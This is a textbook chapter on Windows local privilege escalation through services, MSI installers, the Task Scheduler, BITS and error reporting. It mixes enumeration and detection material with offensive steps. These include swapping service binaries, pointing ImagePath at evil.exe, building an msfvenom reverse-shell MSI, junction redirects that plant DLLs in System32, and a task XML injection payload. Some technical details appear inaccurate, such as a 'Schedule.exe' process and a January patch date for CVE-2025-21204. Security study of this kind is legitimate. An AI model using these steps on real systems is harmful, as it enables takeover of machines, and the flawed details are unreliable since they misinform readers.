# Chapter 07 — Windows Services, Installers & Updaters
## Local Privilege Escalation Through System Infrastructure

---

## 1. Service Control Manager (SCM) Architecture

> **See also:** ch08 §2 (Service binary weak ACL as bug class). ch17 §Lab 11 (hands-on weak service permissions lab).

### 1.1 What the SCM Is

The Service Control Manager (`services.exe`) is the first non-kernel process launched by `wininit.exe` during boot. It is responsible for the complete lifecycle of all Windows services: creation, ordering, dependency resolution, startup, monitoring, and shutdown. The SCM exposes an RPC interface (`svcctl`) consumed by `sc.exe`, PowerShell `*-Service` cmdlets, and any application that calls the Win32 service APIs (`OpenSCManager`, `OpenService`, `ChangeServiceConfig`, etc.).

Every service registration is stored under `HKLM\SYSTEM\CurrentControlSet\Services\<name>`. The critical subkeys are:
- `ImagePath` — the binary path, including command-line arguments
- `ObjectName` — the account under which the service runs
- `Start` — numeric startup type (0=Boot, 1=System, 2=Automatic, 3=Manual, 4=Disabled)
- `Type` — service type bitmask

The SCM maintains an in-memory service database and uses an event-based notification mechanism to communicate state changes between the SCM process and the service's service-control handler thread (registered via `RegisterServiceCtrlHandler`).

### 1.2 Service Types

| Type Value | Symbolic Name | Description |
|------------|--------------|-------------|
| 0x01 | `SERVICE_KERNEL_DRIVER` | Kernel-mode driver |
| 0x02 | `SERVICE_FILE_SYSTEM_DRIVER` | File system driver |
| 0x10 | `SERVICE_WIN32_OWN_PROCESS` | Service in its own process |
| 0x20 | `SERVICE_WIN32_SHARE_PROCESS` | Service sharing a `svchost.exe` process with others |
| 0x50 | `SERVICE_USER_OWN_PROCESS` | User-mode service in own process |
| 0x60 | `SERVICE_USER_SHARE_PROCESS` | User-mode service sharing process |
| 0x100 | `SERVICE_INTERACTIVE_PROCESS` | Can interact with desktop (deprecated) |

`SERVICE_WIN32_SHARE_PROCESS` is the dominant type for Microsoft services. Multiple services coexist inside a single `svchost.exe` instance, sharing the process token but each with its own DLL (`Parameters\ServiceDll`) and thread pool. This architecture means a vulnerability in any DLL loaded by a shared `svchost.exe` instance potentially affects all co-resident services.

### 1.3 Service Account Contexts

The choice of `ObjectName` determines the security context in which the service binary runs. From an attacker's perspective, understanding these accounts is prerequisite to understanding privilege escalation paths.

**LocalSystem (`.` / `NT AUTHORITY\SYSTEM`):**
- The most privileged built-in service account
- Has `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeTcbPrivilege`, `SeDebugPrivilege`, and virtually all system privileges
- Has full access to the local machine including the SAM database
- On domain-joined machines, authenticates to the network as `MACHINENAME$`
- Runs the SCM itself, WMI, Task Scheduler, Windows Installer, Print Spooler, and most Windows core services
- **Attack significance:** Any code execution inside a LocalSystem process is immediately SYSTEM. Any file operation performed by a LocalSystem service without proper path validation is a potential LPE primitive.

**LocalService (`NT AUTHORITY\LOCAL SERVICE`):**
- Limited subset of privileges compared to LocalSystem
- Has `SeImpersonatePrivilege` but NOT `SeAssignPrimaryTokenPrivilege`
- No network credentials — presents as anonymous on the network
- Access to machine-level resources restricted compared to LocalSystem
- Services: AudioSrv, EventLog (in share mode), CertPropSvc
- **Attack significance:** `SeImpersonatePrivilege` is present. This means LocalService processes can be escalated to SYSTEM via PrintSpoofer/GodPotato-class techniques. However, some specific privileges (e.g., `SeAuditPrivilege`) may be missing from the token. The `FullPowers` tool (see §6.4) recovers these.

**NetworkService (`NT AUTHORITY\NETWORK SERVICE`):**
- Similar to LocalService but presents machine credentials (`MACHINENAME$`) on the network
- Has `SeImpersonatePrivilege` but NOT `SeAssignPrimaryTokenPrivilege`
- Services: DNS client, BITS, Remote Procedure Call, SQL Server Express
- **Attack significance:** Same escalation paths as LocalService. NetworkService-level code execution inside IIS (`W3SVC`), SQL Server, or MSSQL Agent is a common post-exploitation starting point.

**Virtual Accounts (`NT SERVICE\<ServiceName>`):**
- Introduced in Windows Server 2008 R2 / Windows 7
- Per-service isolated accounts that do not have a password manageable externally
- Authenticate to network as `MACHINENAME$`
- Privileges are limited to what the service requires
- **Attack significance:** If the virtual account has `SeImpersonatePrivilege` (it often does), Potato-class escalation still applies.

**Managed Service Accounts (MSA) and Group Managed Service Accounts (gMSA):**
- Domain-based accounts with automatic password management
- gMSA is the preferred modern pattern for services needing domain access
- Passwords managed by the DC, not the service itself
- **Attack significance:** Lower attack surface for credential theft; the password hash is not stored locally in a form easily dumped. However, if the service process has `SeImpersonatePrivilege`, token-based escalation still works.

**Privilege Matrix:**

| Account | SeImpersonate | SeAssignPrimaryToken | SeTcbPrivilege | Network Auth |
|---------|:---:|:---:|:---:|:---:|
| LocalSystem | ✓ | ✓ | ✓ | MACHINENAME$ |
| LocalService | ✓ | ✗ | ✗ | Anonymous |
| NetworkService | ✓ | ✗ | ✗ | MACHINENAME$ |
| IIS AppPool | ✓ | ✗ | ✗ | MACHINENAME$ |
| Virtual Account | ✓ | ✗ | ✗ | MACHINENAME$ |
| Custom (restricted) | Varies | ✗ | ✗ | Varies |

---

## 2. Service Configuration Weaknesses

### 2.1 Binary Path ACL (Weak Service Binary Permissions)

**Root cause:** The service binary (`ImagePath`) or its parent directory has a DACL that grants write access to a low-privilege user.

**How to find:**
```powershell
# Using PrivescCheck (preferred)
Invoke-PrivescCheck -Extended

# Manual — check binary ACL
icacls "C:\Program Files\VendorApp\service.exe"
# Look for: BUILTIN\Users:(M), Everyone:(W), INTERACTIVE:(W)

# PowerSploit
Get-ModifiableServiceFile
```

**Exploitation:**
1. Identify the service binary with write permission
2. Back up the original (recommended for safety in real engagements)
3. Replace with a payload binary having the same name
4. Trigger a service restart: `sc stop <name> && sc start <name>` (if stop/start permission exists), or wait for restart/reboot
5. The payload executes under the service's account (LocalSystem in most cases)

**Note:** Even if you can't restart the service, planting the binary and waiting for a system reboot is sufficient — services with `Start=2` (Automatic) restart at boot.

### 2.2 Service Registry Key ACL

**Root cause:** The registry key `HKLM\SYSTEM\CurrentControlSet\Services\<name>` has write access for low-privilege users, allowing modification of `ImagePath` or `ObjectName`.

**Notable real-world example:** The RpcEptMapper and DNSCache service keys on unpatched Windows 10/Server 2019 were writable by low-privilege users. itm4n exploited this by writing a `Parameters\ServiceDll` value pointing to a malicious DLL, causing the SYSTEM-context service host to load it (CVE-2019-0943 pattern).

**How to find:**
```powershell
$services = Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services"
foreach ($svc in $services) {
    $acl = Get-Acl $svc.PSPath
    $acl.Access | Where-Object {
        ($_.IdentityReference -match "Users|Authenticated Users|Everyone") -and
        ($_.RegistryRights -match "Write|FullControl|SetValue")
    } | ForEach-Object { "$($svc.Name) — $($_.IdentityReference) — $($_.RegistryRights)" }
}
```

**Exploitation pattern:**
```
1. Write to ImagePath: reg add HKLM\...\Services\Vulnerable /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\attacker\evil.exe"
2. Restart service (or wait)
3. evil.exe runs as service account (often SYSTEM)
```

The `Parameters\ServiceDll` variant is more surgical — the service host process (`svchost.exe`) continues running normally for other co-resident services, only loading the malicious DLL.

### 2.3 Unquoted Service Paths

**Root cause:** A service binary path contains spaces and is not enclosed in quotation marks. The Windows `CreateProcess` call resolves the unquoted path by trying each space-separated segment as an executable:

```
Path: C:\Program Files\Vendor App\service binary.exe
Attempts:
  1. C:\Program.exe
  2. C:\Program Files\Vendor.exe
  3. C:\Program Files\Vendor App\service.exe  ← actual
  4. C:\Program Files\Vendor App\service binary.exe
```

If any of these paths is in a directory writable by the attacker, a binary planted there executes as the service account.

**How to find:**
```cmd
wmic service get name,pathname,startname,startmode | findstr /v "C:\\Windows"
:: Look for paths with spaces but no quotes around the full path
```
```powershell
# PrivescCheck covers this
Invoke-PrivescCheck -Extended | Where-Object { $_.Category -eq "Services > Binary Path" }
```

**Prevalence:** Extremely common in third-party enterprise software (SIEM agents, endpoint management tools, AV products). The root directory `C:\` is sometimes writable on misconfigured systems, making `C:\Program.exe` the attack vector.

### 2.4 DLL Search Order Hijacking in Services

When a service binary (or a DLL it loads) calls `LoadLibrary("example.dll")` without a full path, the Windows loader searches in order:
1. **KnownDLLs** — `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` — DLLs listed here are loaded from `\KnownDlls` object directory directly; cannot be hijacked
2. **DLL Redirection folder** — `<exedir>\<exename>.local\`
3. **Application manifest SxS assembly**
4. **Already-loaded modules** (DLL cache in process)
5. **System directory** — `C:\Windows\System32\`
6. **16-bit system directory** — `C:\Windows\System\`
7. **Windows directory** — `C:\Windows\`
8. **Current working directory** — dangerous if attacker-controlled
9. **PATH environment variable directories** — each directory in `%PATH%` in order

**Attack surface categories:**

*Missing DLL hijack:* Service attempts to load a DLL that doesn't exist in System32 or elsewhere. If the first writable PATH entry exists before the expected location, an attacker-placed DLL is loaded. Detect with Process Monitor filter: `Result=NAME NOT FOUND`, `Path ends with .dll`, `Process Name=<privileged binary>`.

*Phantom DLL:* A DLL that Windows expects in System32 but was removed or never existed. Historical examples include `wlbsctrl.dll` (IKEEXT service) and `TSMSISrv.dll` (Terminal Services).

*PATH directory weak permissions:* `icacls` each directory in `%PATH%`. Any user-writable directory in the PATH allows DLL planting for any process that doesn't use `LOAD_LIBRARY_SEARCH_SYSTEM32`.

*Application directory:* If the service binary is in a directory writable by the attacker (e.g., `C:\ProgramData\VendorName\`), any DLL loaded by the service from the same directory can be replaced.

**Bypass of `SafeDllSearchMode`:** Even with `SafeDllSearchMode=1` (moves current directory search to position 8 instead of 4), if the PATH contains a writable directory before System32, hijacking remains possible.

---

## 3. Windows Installer (MSI) Architecture

> **Tools:** ch15 §msiscan. **Bug class:** ch08 §6 (DLL hijacking in MSI custom actions).

### 3.1 MSI Service Internals

The Windows Installer service (`msiserver`, implemented in `msi.dll` and `msiexec.exe`) is responsible for installing, repairing, patching, and removing software packages. It runs as **LocalSystem** for system-scope (per-machine) installations.

**Installation phases and their security context:**

| Phase | Security Context | Network Access | Key Operations |
|-------|:---:|:---:|:---|
| Immediate | User/Admin | Yes | Script building, resource gathering |
| Deferred (elevated) | SYSTEM | No | Actual file copy, registry write |
| Rollback | SYSTEM | No | Undo deferred actions |
| Commit | User/Admin | Yes | Final commit after deferred |
| Custom Action Type 1 | SYSTEM (if deferred) | No | DLL/EXE in elevated context |
| Custom Action Type 2 | User | Yes | Script/DLL in user context |

The critical insight: **deferred actions run as SYSTEM**. All privileged file system operations during installation happen in this phase. Any manipulation of paths used during deferred execution can achieve SYSTEM code execution.

**Cached MSI packages:**
When a product is installed with per-machine scope, the MSI package is cached in `C:\Windows\Installer\{GUID}.msi`. This file is owned by SYSTEM but readable by all users. The product remains **advertised** — meaning it can be repaired later without a new installation source.

**Advertised installs and the repair vector:**
An advertised install is a product registered in the system's installer database that can be self-repaired. The repair is triggered by `msiexec /fa {ProductCode}` (or `/f` with various flags), which re-runs deferred actions as SYSTEM to restore the product to its advertised state.

### 3.2 InstallerFileTakeOver — Step-by-Step

Researcher Abdelhamid Naceri (klinix5/halov) discovered that the MSI repair mechanism can be redirected via NTFS junction manipulation to achieve an arbitrary file move primitive.

**Prerequisites:** Any standard local user account. No special privileges required.

**Step-by-step exploitation:**

```
Step 1: Locate an advertised MSI product
   wmic product get name,identifyingnumber,installlocation
   → Find a product with cached MSI and repair capability

Step 2: Identify the cached MSI file
   dir C:\Windows\Installer\*.msi
   → Use msiinfo/orca.exe to match product GUID to cached file

Step 3: Understand what the repair will do
   Open the MSI in Orca.exe (Microsoft SDK tool)
   → Look at File table: which files are moved during repair?
   → Identify staging path (usually under %TEMP% or component temp directory)

Step 4: Set up the junction redirect
   Create attacker directory: mkdir C:\Temp\Stage
   Stage the payload DLL there: copy evil.dll C:\Temp\Stage\target.dll
   
Step 5: Trigger the repair
   msiexec /fav {PRODUCT-CODE-GUID}
   
Step 6: During repair, before the SYSTEM file move completes:
   The MSI service moves files from staging area to install location
   Using junction at the staging path → redirect destination
   The privileged file move goes to attacker-chosen high-value path
   
   Example redirect:
   Junction: C:\ProgramData\Vendor\App\  →  C:\Windows\System32\
   Result: MSI repair copies attacker DLL to C:\Windows\System32\target.dll
   
Step 7: Leverage the displaced file
   Option A: Wait for a service to auto-load the DLL (DLL search order)
   Option B: Use the planted DLL path as a write primitive to trigger code execution
   Option C: Overwrite a service binary binary or config file
```

**The underlying mechanism:** The SYSTEM process (msiexec.exe deferred phase) uses `MoveFileEx` or `NtSetInformationFile` with `FileRenameInformation` to move staged files to their final locations. It does NOT check `OBJ_DONT_REPARSE`, so junction traversal works. The attacker's junction swaps the destination directory from the legitimate install path to any SYSTEM-writable path (including `C:\Windows\System32\`).

**Naceri's bypass context:** CVE-2021-41379 was issued for an MSI privilege escalation. The patch applied incorrect ACLs. Naceri published `InstallerFileTakeOver` as a bypass that worked on the patched system, demonstrating the fundamental architectural issue with repair-as-SYSTEM.

### 3.3 AlwaysInstallElevated

**Configuration:**
- `HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1`
- `HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1`

**Both keys must be set.** When both are present, the Windows Installer service elevates every MSI installation regardless of the user's privileges. An attacker with a custom-crafted MSI can execute arbitrary code as SYSTEM.

**Detection:**
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Exploitation:**
Create a minimal MSI with a Type 1 deferred custom action that executes a payload:
```
# Using msfvenom or manual creation:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=... LPORT=... -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```
The custom action runs as SYSTEM due to the policy setting.

**Prevalence:** Common in enterprise environments where IT deploys software without requiring admin credentials per-deployment. Often set via Group Policy without understanding the security implications.

### 3.4 MSI Custom Actions — Security Detail

Custom Actions are code injections points within MSI packages. Their execution context determines their privilege level:

**Type 1 — DLL function:** Calls a function in a DLL specified in the `Source` column. If deferred (sequence ≥ 1000), runs as SYSTEM.

**Type 2 — EXE:** Calls an executable with specified arguments. Deferred = SYSTEM context.

**Type 34 — Directory-level EXE:** Runs an EXE from the installed location. If the installed location is writable by the attacker, this is exploitable.

**Attack angle for research:** When auditing third-party MSI packages:
1. Open package in Orca.exe
2. Examine `CustomAction` table for Type 1/2/34 entries
3. Check `InstallExecuteSequence` for deferred sequence numbers
4. If the DLL in `Source` column is loaded from an attacker-writable path during repair, DLL hijack is possible

### 3.5 msiscan — Static Analysis Tool (2024)

`msiscan` is an open-source static analysis tool released in 2024 that automates the audit process for MSI packages against known privilege escalation patterns. It parses the MSI database tables directly (using the Windows Installer API or libmsi on Linux) and reports:

- All deferred custom actions with their type and source paths
- `AlwaysInstallElevated` detection via policy registry checks
- File table entries pointing to attacker-writable staging paths
- Component paths that resolve to writable directories at repair time
- Custom actions referencing DLLs without full-path qualification

**Usage pattern:**
```cmd
msiscan.exe --file C:\path\to\package.msi --report json --output results.json
msiscan.exe --cached   # Scans all cached MSIs in C:\Windows\Installer\
msiscan.exe --product {GUID} --check-repair  # Simulates repair flow analysis
```

**Research value:** msiscan reduces the manual Orca.exe workflow to an automated pipeline. It is particularly useful for batch-auditing third-party enterprise software packages where manual review of hundreds of MSIs is impractical.

### 3.6 CVE-2024-38215 — Windows Install Service EOP

**Component:** Windows Install Service (`TrustedInstaller` / `msiserver`)

**CVSS:** 7.8 (High) — Local, Low Complexity, Low Privileges Required, No User Interaction

**Root cause:** A logic error in the Windows Install Service allowed a low-privilege user to trigger a privileged file operation by manipulating the transaction commit sequence in a specific way. The vulnerability resided in the handling of rollback scripts when a transaction was aborted under race conditions — the service failed to properly validate the caller's identity before executing a deferred rollback action.

**Impact:** Arbitrary code execution as LocalSystem. An attacker who could create and abort MSI transactions in a timed fashion could leverage the race to execute a payload in the rollback phase, which runs as SYSTEM without re-validating the original caller's context.

**Patch:** August 2024 Patch Tuesday. The fix added explicit impersonation checks before rollback script execution and locked down the transaction abort code path.

**Research note:** This CVE is part of the recurring pattern where the MSI deferred/rollback execution model creates windows (pun intended) for privilege escalation via context confusion between the initiating user and the SYSTEM execution context.

### 3.7 CVE-2025-21204 — Windows Update Stack LPE

**Component:** Windows Update Stack — installer detection logic

**CVSS:** 7.8 (High) — Local privilege escalation

**Root cause:** The Windows Update Stack's installer detection component failed to properly validate symbolic links when checking whether a pending installer was legitimate. An attacker could create a symbolic link in the pending installers directory that caused the Update Stack to process an attacker-controlled path as a trusted installer target.

**Mechanism:**
```
1. Low-privilege user creates a directory junction or symbolic link under
   the Windows Update staging area (e.g., C:\$WinREAgent\ or
   C:\Windows\SoftwareDistribution\Download\)

2. The Update Stack's installer detection code follows the symbolic link
   without enforcing OBJ_DONT_REPARSE — treating the attacker-controlled
   path as a legitimate installer payload

3. The Update Stack (running as TrustedInstaller or LocalSystem) processes
   the attacker-controlled content as a trusted update package

4. Result: arbitrary code execution as SYSTEM / TrustedInstaller
```

**Key difference from classic junction attacks:** CVE-2025-21204 specifically targets the *installer detection bypass* — the component that decides whether a file in a staging area should be run as a trusted installer. By bypassing this detection with a symbolic link, the attacker elevates without needing to exploit the repair mechanism directly.

**Patch:** January 2025 Patch Tuesday. Microsoft hardened the installer detection logic to validate link targets and added `OBJ_DONT_REPARSE` flags on critical path resolution calls.

### 3.8 AlwaysInstallElevated Hardening in Windows 11 24H2

Windows 11 24H2 (released October 2024) introduced a new Group Policy setting that supersedes the legacy `AlwaysInstallElevated` behavior:

**New policy path:**
```
Computer Configuration → Administrative Templates → Windows Components →
Windows Installer → "Prohibit installation of elevated MSI packages by standard users"
```

**Behavior changes in 24H2:**
- When the new policy is enabled, the Windows Installer service now logs a warning event (Event ID 11728 in the Application log) when `AlwaysInstallElevated` is detected, even before installation begins
- The Installer service validates the GPO application order more strictly — a `HKCU` key set by a user without a corresponding `HKLM` policy is no longer sufficient to trigger elevation
- Smart App Control (SAC) in 24H2 can block unsigned MSI packages regardless of the `AlwaysInstallElevated` setting, adding a defense-in-depth layer

**Bypass research status (2024-2025):** The 24H2 hardening specifically addresses the dual-key requirement bypass. Researchers have noted that the new policy does not retroactively affect already-installed products with repair capability — the InstallerFileTakeOver class of attacks remains viable on 24H2 for products installed before the policy was applied.

### 3.9 MSI Custom Action Monitoring via ETW

The `Microsoft-Windows-MsiServer` ETW provider (GUID: `{A45C254E-DF1C-4EFD-8E69-598D92D850F6}`) emits events for all MSI custom action execution:

**Relevant event IDs:**
| Event ID | Description | Key Fields |
|----------|-------------|-----------|
| 1000 | Custom action started | ActionType, ActionSource, ActionTarget |
| 1001 | Custom action completed | ActionType, ReturnCode, Duration |
| 1002 | Custom action failed | ActionType, ErrorCode, ActionSource |
| 11707 | Installation completed successfully | ProductName, ProductVersion |
| 11708 | Installation failed | ProductName, ErrorCode |

**Monitoring setup:**
```powershell
# Enable MSI server ETW tracing
$session = New-EtwTraceSession -Name "MSIAudit" -LogFileMode 0x8000100
Add-EtwTraceProvider -SessionName "MSIAudit" `
    -Guid "{A45C254E-DF1C-4EFD-8E69-598D92D850F6}" `
    -Level 5 -MatchAnyKeyword 0xFFFFFFFF

# Real-time monitoring via logman
logman start MSITrace -p "Microsoft-Windows-MsiServer" 0xFFFFFFFF win:Verbose `
    -ets -o C:\Temp\msi_trace.etl
# ... trigger MSI activity ...
logman stop MSITrace -ets
tracerpt C:\Temp\msi_trace.etl -o C:\Temp\msi_report.xml
```

**Security research application:** ETW monitoring of `MsiServer` events is the most reliable method to catch deferred custom actions running under SYSTEM context during installation. Combined with a ProcMon capture, this provides complete visibility into what paths the SYSTEM-context installer accesses — ideal for identifying new junction/symlink attack vectors in third-party MSI packages.

---

## 4. Task Scheduler as LPE Vector

> **Case study:** ch13 §13.12 (CVE-2024-49039 — RomCom APT Task Scheduler exploitation). ch17 §Lab 14 (AppContainer RPC lab).

### 4.1 Architecture and Attack Surface

The Task Scheduler service (`Schedule.exe`) runs as LocalSystem and manages all scheduled tasks. It exposes:
- An ALPC port interface (`\RPC Control\ITaskSchedulerService`) for local administration
- A COM interface (`ITaskService` / `ITaskScheduler`)
- An RPC-over-named-pipe interface accessible remotely

Tasks are stored in `C:\Windows\System32\Tasks\` (XML files) and in the registry under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks`.

**Why the Task Scheduler is high-value:** Jobs run in the security context of their configured principal. Tasks configured as `NT AUTHORITY\SYSTEM` execute with full SYSTEM privileges. Tasks with `RunLevel=Highest` run elevated.

### 4.2 SandboxEscaper CVE Pattern (ALPC + Job File Race)

Between 2018 and 2019, the researcher known as SandboxEscaper published multiple Windows LPE exploits targeting the Task Scheduler as 0-days. The techniques illustrate the recurring patterns.

**CVE-2018-8440 (Task Scheduler ALPC Interface):**
The Task Scheduler's ALPC interface method `SchRpcSetSecurity` set the DACL on a task's job file (`.job` format, used in legacy compatibility mode). The bug: the service improperly propagated the DACL to the task file's location without validating that the path hadn't been redirected. By timing a junction swap, an attacker could make the SYSTEM-level `SchRpcSetSecurity` call set an arbitrary DACL on any file in the filesystem.

**Result:** Arbitrary DACL write → change ACL on any file to grant user full control → read SAM hive, modify service binary, etc.

**CVE-2019-1069 (Task Scheduler popen() Race):**
The Task Scheduler used `popen()` for logging task output. The race: between checking the log path and opening the file for writing, a junction could be injected to redirect the write to an arbitrary path. The privileged write became an arbitrary file write primitive.

**What these teach architecturally:**
- The ALPC interface itself is an attack surface separate from the task binary
- Privileged services that handle user-controlled paths (even log paths) are dangerous
- The combination of ALPC interface access + SYSTEM execution context + path-following file operations is a recurring vulnerability class

### 4.3 Scheduled Task Binary Hijacking

Beyond the 0-day patterns, scheduled tasks represent an ongoing low-tech attack surface:

1. **Task runs binary from writable directory:** If a SYSTEM-privileged task runs `C:\ProgramData\Vendor\updater.exe` and that directory is writable, replace the binary.
2. **Task DLL hijack:** The task binary loads DLLs from an attacker-writable directory.
3. **XML DACL misconfiguration:** Task XML files in `C:\Windows\System32\Tasks\` are sometimes writable by non-admin users due to misconfigured ACLs inherited from vendor installers.

**Enumeration:**
```powershell
Get-ScheduledTask | Where-Object {
    $_.Principal.RunLevel -eq "Highest" -or 
    $_.Principal.UserId -in @("SYSTEM", "NT AUTHORITY\SYSTEM")
} | Select-Object TaskName, @{N="Binary";E={$_.Actions.Execute}} |
    ForEach-Object {
        if ($_.Binary) { $acl = icacls $_.Binary 2>&1; "$($_.TaskName): $($_.Binary)" }
    }
```

### 4.4 CVE-2024-49039 — Windows Task Scheduler EOP (In-the-Wild)

**Component:** Windows Task Scheduler — RPC interface

**CVSS:** 8.8 (High) — Local privilege escalation, Low privileges required

**Exploitation status:** Actively exploited in the wild. Attributed to the **RomCom APT group** (aka UNC2596, Tropical Scorpius), observed in campaigns targeting Ukrainian government entities and European defense contractors in late 2024. Combined with CVE-2024-49040 (Outlook spoofing) in chained attack scenarios.

**Root cause:** A flaw in the Task Scheduler's RPC interface allowed a low-privilege user to call a privileged RPC method that should have been restricted to administrators. The improper access control check on a specific `ITaskSchedulerService` RPC method permitted low-integrity processes to register and trigger tasks running as higher-privileged principals — including SYSTEM.

**Technical detail:**
```
Vulnerable method: ITaskSchedulerService::RegisterTask (or related method)
Attack flow:
  1. Low-privilege attacker calls the vulnerable RPC method with
     crafted task XML specifying Principal.UserId = "SYSTEM"
     and RunLevel = "HighestAvailable"
  
  2. The RPC server-side access check incorrectly validates only
     the task's destination path, not the caller's right to register
     tasks as higher-privileged principals
  
  3. The registered task executes immediately (or on trigger) as SYSTEM
  
  4. RomCom's in-the-wild usage: task action launches a dropper that
     installs a persistence backdoor in C:\Windows\System32\
```

**Patch:** November 2024 Patch Tuesday. Microsoft added explicit caller privilege validation before allowing task registration with elevated principals.

**Detection:**
- Event ID 4698 (Task Scheduler: A scheduled task was created) — monitor for creation by non-admin accounts with SYSTEM principals
- Microsoft Defender detection: `Exploit:Win32/CVE-2024-49039`
- Sysmon Event ID 1 filtering for `schtasks.exe` or direct RPC calls from low-integrity processes

### 4.5 schtasks Security Descriptor Race — Variant Hunting

Post-patch analysis of CVE-2024-49039 revealed an adjacent race condition pattern in the `schtasks.exe` command-line utility that warrants continued research:

**The race pattern:**
```
1. schtasks /Create /RU SYSTEM /SC ONCE /TN "LegitTask" /TR "cmd.exe" /ST ...
   → schtasks calls Task Scheduler RPC to register the task

2. Race window: Between the RPC call completing and the security descriptor
   being written to C:\Windows\System32\Tasks\LegitTask, there is a brief
   period where the task XML file exists but has not yet received its final
   DACL

3. A racing process with write access to the Tasks\ directory (misconfigured
   installations sometimes grant this) can modify the XML during this window
   → Substitute Principal.UserId, modify Actions, inject Arguments

4. The Scheduler reads the "finalized" XML for execution but uses the
   modified content from step 3
```

**Variant hunting approach:**
- Instrument `NtSetSecurityObject` calls on `C:\Windows\System32\Tasks\` with a driver or ETW
- Log timing gaps between `NtCreateFile` (task XML creation) and the subsequent security descriptor application
- Any gap > ~50ms on a loaded system is a potential exploitation window
- Focus on tasks created via WMI or COM automation rather than `schtasks.exe` — different code paths may have different gap sizes

### 4.6 Task XML Injection — `<Arguments>` Field Sanitization

A recurring pattern in third-party software that programmatically creates scheduled tasks:

**Vulnerable code pattern (C#):**
```csharp
// Insecure: user input directly interpolated into task XML
string taskXml = $@"
<Task>
  <Actions>
    <Exec>
      <Command>C:\Tools\Processor.exe</Command>
      <Arguments>{userInputPath}</Arguments>
    </Exec>
  </Actions>
</Task>";
ITaskService service = new TaskSchedulerClass();
ITaskFolder folder = service.GetFolder("\\");
folder.RegisterTask("UserTask", taskXml, (int)TASK_CREATION.TASK_CREATE, ...);
```

**Injection payloads:**
```
userInputPath = "benign.txt</Arguments></Exec></Actions><Actions><Exec><Command>cmd.exe</Command><Arguments>/c calc.exe</Arguments></Exec></Actions><Actions><Exec><Command>ignored"
```

**Impact:** If the task runs as a higher-privileged account (e.g., the application registers SYSTEM tasks on behalf of users), injection into `<Arguments>` can be escalated to `<Command>` injection by breaking out of the XML structure.

**Detection in code review:** Look for string interpolation or concatenation into task XML without XML-encoding the user-supplied values. `SecurityElement.Escape()` or proper XML serialization (XDocument/XElement) prevents injection.

### 4.7 Enhanced Task Scheduler Audit Logging in Windows 11 24H2

Windows 11 24H2 significantly expanded Task Scheduler audit logging:

**New audit events:**
| Event ID | Channel | Description |
|----------|---------|-------------|
| 4698 | Security | Task created (existing, now includes caller SID) |
| 4699 | Security | Task deleted |
| 4700 | Security | Task enabled |
| 4701 | Security | Task disabled |
| 4702 | Security | Task updated (now logs diff of changed fields) |
| 200 | Microsoft-Windows-TaskScheduler/Operational | Task registered — includes full XML |
| 201 | Microsoft-Windows-TaskScheduler/Operational | Task action started |
| 203 | Microsoft-Windows-TaskScheduler/Operational | Task action completed |

**24H2 additions:**
- Event 4698/4702 now includes the full task XML in the event data (truncated at 32KB)
- Task registration events now record whether the task was registered via RPC, COM, or schtasks.exe
- A new "Task Scheduler Principal Mismatch" event fires when a task is registered with a principal that doesn't match the caller's privilege level (detection for CVE-2024-49039 class attacks)

**Enabling full audit:**
```powershell
# Enable Task Scheduler audit in Security policy
auditpol /set /subcategory:"Other Object Access Events" /success:enable /failure:enable

# Enable operational log (all task events)
wevtutil sl Microsoft-Windows-TaskScheduler/Operational /e:true /ms:104857600
```

---

## 5. BITS — Background Intelligent Transfer Service (CVE-2020-0787)

### 5.1 BITS Architecture

BITS (Background Intelligent Transfer Service) is a system service running as **LocalSystem** that manages asynchronous file transfers. It is used by Windows Update, Windows Defender, and numerous third-party applications via the `IBackgroundCopyManager` COM interface.

BITS jobs persist across reboots and can transfer files to/from network shares or HTTP/HTTPS endpoints. Locally, BITS can download files and write them to specified local paths — as SYSTEM.

### 5.2 CVE-2020-0787 — Missing Impersonation + Junction

**Researcher:** itm4n (Clément Labro)

**Root cause:** When a BITS job was configured to download a file to a local path, the BITS service performed file operations as SYSTEM without impersonating the calling user. This violates the principle that privileged services should impersonate the caller for file operations initiated on the caller's behalf.

**Attack structure:**
```
1. Create a BITS job as low-privilege user:
   IBackgroundCopyManager::CreateJob()
   job->AddFile(src_url, "C:\Legitimate\Path\file.txt")
   job->Resume()

2. BITS service (running as SYSTEM) creates the destination file
   at "C:\Legitimate\Path\file.txt"

3. Before BITS completes the file write:
   Replace "C:\Legitimate\Path\" with a junction pointing to
   "C:\Windows\System32\"

4. BITS continues writing to the junction target:
   C:\Windows\System32\file.txt — arbitrary file write as SYSTEM

5. Contents of the written file = attacker-controlled (the source URL/content)

6. Plant a DLL (e.g., WindowsCodecs.dll if missing from System32,
   or target a DLL loaded by a SYSTEM service on restart)
```

**The missing impersonation:** The correct fix would have been for BITS to call `ImpersonateClient()` before opening the destination file handle. Without impersonation, the file creation check uses the SYSTEM token instead of the caller's token — allowing writes to paths the caller cannot write.

**Mitigation applied in patch:** BITS now impersonates the job owner before performing local file operations.

---

## 6. Windows Error Reporting (WER) as File Write Primitive

> **Primitive chain:** ch09 §1 uses WER arb file write as file primitive. ch08 §1.2.1 covers CVE-2024-30030.

### 6.1 WER Architecture

Windows Error Reporting (`WerSvc`, `WerFault.exe`) runs in SYSTEM context (or elevated context for interactive crash handling) and writes crash dump files to:
- `C:\ProgramData\Microsoft\Windows\WER\ReportQueue\`
- `C:\ProgramData\Microsoft\Windows\WER\ReportArchive\`

`WerFault.exe` is launched as an elevated helper by the kernel crash handler (`WerKernel`) when an application crashes. The crash dump path is derived from process metadata and registry configuration.

### 6.2 Exploit Pattern

The WER crash dump write path can be influenced through:
1. **Junction at report directory:** If the `ReportQueue` or `ReportArchive` directory is replaced with a junction before WER writes the dump, the dump lands in the junction target.
2. **Attacker-controlled process name:** The dump file name incorporates the process name. If a process named strategically and crashed at the right moment, the dump filename approximates a target DLL name.
